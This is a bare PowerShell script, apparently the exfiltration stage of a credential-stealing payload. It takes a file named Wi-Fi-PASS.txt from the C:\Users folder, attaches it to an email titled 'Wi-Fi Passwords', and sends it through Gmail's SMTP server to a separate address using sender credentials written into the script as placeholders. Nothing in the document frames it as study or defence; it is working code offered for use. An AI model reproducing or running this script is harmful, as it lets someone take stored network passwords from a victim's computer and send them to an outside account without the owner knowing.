$User = "<email1>@gmail.com"
$File = "C:\Users\Wi-Fi-PASS.txt"
$EmailTo = "<email2>@gmail.com"
$EmailFrom = "<email1>@gmail.com"
$Subject = "Wi-Fi Passwords"
$Body = "Here's the wi-fi passwords"
$SMTPServer = "smtp.gmail.com"
$filenameAndPath = "C:\Users\Wi-Fi-PASS.txt"
$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
$attachment = New-Object System.Net.Mail.Attachment($filenameAndPath)
$SMTPMessage.Attachments.Add($attachment)
$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(“<email1>@gmail.com”, “<this is password>”);
$SMTPClient.Send($SMTPMessage)
